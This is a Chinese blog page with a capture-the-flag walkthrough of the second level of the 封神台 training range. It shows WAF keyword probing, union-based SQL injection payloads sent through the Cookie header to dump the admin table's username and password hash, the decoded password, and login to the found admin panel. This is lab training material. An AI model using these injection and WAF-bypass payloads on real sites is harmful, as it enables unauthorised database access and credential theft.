<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>封神台第二关 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="封神台第二关" />
<meta property="og:description" content="点击传送门
来到目标公司网站
可以看到有很多的网页
现在我们需要寻找注入点，注入点存在的页面一般可以明显的显示出正确页面和错误页面
这里可以看到有新闻页面
有新闻的一般选择新闻页面
我们点击第一个新闻
进来后可以看到
URL为
http://g8wepfcp.ia.aqlab.cn/shownews.asp?id=171
开始试探 （1）判断waf拦截的关键字
&#39;触发waf
and触发waf
or触发waf
select触发waf
union order by不会触发waf
--&#43;不能被数据库识别，要使用#
（2）联合查询注入尝试
得到注入点数量，构建联合查询语句
?id=171 union select 1,2,3,4,5,6,7,8,9,10#
利用SQL绕过手法使得select可用
试图转码绕过失败
试图利用/**/和/*!*/绕过失败
放弃联合查询
（3）cookies绕过尝试
尝试cookies绕过
直接访问http://g8wepfcp.ia.aqlab.cn/shownews.asp
利用bp抓包，将原cookies值
Cookie: ASPSESSIONIDACQTQQAS=OKOJFAODPDJCCFEKBAECGJDK
改为
Cookie: id=171
访问网页，发现访问的页面正常输出，cookies可以当值来用
将值改为联合查询语句
并猜测表admin的存在性
Cookie: id=171&#43;union&#43;select&#43;1,2,3,4,5,6,7,8,9,10&#43;from&#43;admin
页面返回正常，说明admin表存在
且页面返回的字段有2,3,7,8,9
这时可以将注入点2,3,7,8,9替换为字段名，用这种方式来猜测字段的存在，并体现返回值
Cookie: id=171&#43;union&#43;select&#43;1,username,password,4,5,6,7,8,9,10&#43;from&#43;admin
页面返回
username：admin
password：b9a2a2b5dffb918c
利用bp解码后
password为welcome
利用御剑后台扫描工具
得到后台网站
http://g8wepfcp.ia.aqlab.cn/admin/Login.asp
输入账户密码
成功通过" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/3e909604496b908f459341b01aad5db3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-21T20:57:22+08:00" />
<meta property="article:modified_time" content="2023-11-21T20:57:22+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">封神台第二关</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>点击传送门</p> 
<p>来到目标公司网站</p> 
<p></p> 
<p class="img-center"><img alt="" height="1200" src="https://images2.imgbox.com/70/7e/PxsjXCty_o.png" width="1200"></p> 
<p> 可以看到有很多的网页</p> 
<p>现在我们需要寻找注入点，注入点存在的页面一般可以明显的显示出正确页面和错误页面</p> 
<p>这里可以看到有新闻页面</p> 
<p>有新闻的一般选择新闻页面</p> 
<p>我们点击第一个新闻</p> 
<p></p> 
<p class="img-center"><img alt="" height="1200" src="https://images2.imgbox.com/be/e1/KAsteWhl_o.png" width="1200"></p> 
<p> 进来后可以看到</p> 
<p></p> 
<p class="img-center"><img alt="" height="1200" src="https://images2.imgbox.com/4b/6c/7L1oLjkp_o.png" width="1200"></p> 
<p> URL为</p> 
<p>http://g8wepfcp.ia.aqlab.cn/shownews.asp?id=171</p> 
<h2>开始试探</h2> 
<p>（1）判断waf拦截的关键字<br> '触发waf<br> and触发waf<br> or触发waf<br> select触发waf<br> union order by不会触发waf<br> --+不能被数据库识别，要使用#<br> （2）联合查询注入尝试<br> 得到注入点数量，构建联合查询语句<br> ?id=171 union select 1,2,3,4,5,6,7,8,9,10#<br> 利用SQL绕过手法使得select可用<br> 试图转码绕过失败<br> 试图利用/**/和/*!*/绕过失败<br> 放弃联合查询<br> （3）cookies绕过尝试<br> 尝试cookies绕过<br> 直接访问http://g8wepfcp.ia.aqlab.cn/shownews.asp<br> 利用bp抓包，将原cookies值<br> Cookie: ASPSESSIONIDACQTQQAS=OKOJFAODPDJCCFEKBAECGJDK<br> 改为<br> Cookie: id=171</p> 
<p></p> 
<p class="img-center"><img alt="" height="1035" src="https://images2.imgbox.com/35/f5/Ydv5i6Iw_o.png" width="1200"></p> 
<p></p> 
<p>访问网页，发现访问的页面正常输出，cookies可以当值来用<br> 将值改为联合查询语句<br> 并猜测表admin的存在性<br> Cookie: id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin</p> 
<p></p> 
<p class="img-center"><img alt="" height="941" src="https://images2.imgbox.com/c0/35/CjsIrBEN_o.png" width="1200"></p> 
<p>页面返回正常，说明admin表存在<br> 且页面返回的字段有2,3,7,8,9<br> 这时可以将注入点2,3,7,8,9替换为字段名，用这种方式来猜测字段的存在，并体现返回值<br> Cookie: id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin<br> 页面返回</p> 
<p></p> 
<p class="img-center"><img alt="" height="644" src="https://images2.imgbox.com/b3/1b/YHgtgYEB_o.png" width="1200"></p> 
<p>username：admin<br> password：b9a2a2b5dffb918c<br> 利用bp解码后</p> 
<p></p> 
<p class="img-center"><img alt="" height="808" src="https://images2.imgbox.com/11/56/NPcaXj0q_o.png" width="1200"></p> 
<p>password为welcome</p> 
<p>利用御剑后台扫描工具</p> 
<p></p> 
<p class="img-center"><img alt="" height="822" src="https://images2.imgbox.com/79/46/mS6OtWLf_o.png" width="1130"></p> 
<p> 得到后台网站</p> 
<p>http://g8wepfcp.ia.aqlab.cn/admin/Login.asp</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="719" src="https://images2.imgbox.com/0c/ad/yZwdrhPZ_o.png" width="1200"></p> 
<p> 输入账户密码</p> 
<p></p> 
<p class="img-center"><img alt="" height="749" src="https://images2.imgbox.com/01/9e/rVADB3Aa_o.png" width="1200"></p> 
<p> 成功通过</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b5df0e27e940cb50d32341352914e991/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java开发中有用的笔记</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d47214ab01a82c7f0541a171e3602103/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">pygame播放视频并实现音视频同步</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>